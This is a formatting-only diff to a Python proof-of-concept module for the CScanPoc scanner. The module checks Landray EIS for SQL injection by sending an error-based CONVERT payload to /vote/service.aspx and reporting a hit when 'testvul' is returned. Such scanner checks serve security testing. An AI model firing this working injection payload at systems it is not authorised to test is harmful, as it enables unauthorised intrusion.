@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Landray_0004'  # 平台漏洞编号，留空
     name = '蓝凌EIS智慧协同平台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         蓝凌EIS智慧协同平台
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '蓝凌EIS智慧协同平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '3ccd7045-285a-450b-8a2d-f4a778ac9262'
@@ -36,7 +38,7 @@ class Poc(ABPoc):
             arg = self.target
             vul_url = arg + "/vote/service.aspx"
             payload = "action=voteid&ID=1'+and+1=CONVERT(int,%27test%27%2b%27vul%27)--"
-            code, _, res, _, _ = hh.http(vul_url,payload)
+            code, _, res, _, _ = hh.http(vul_url, payload)
             if 'testvul' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
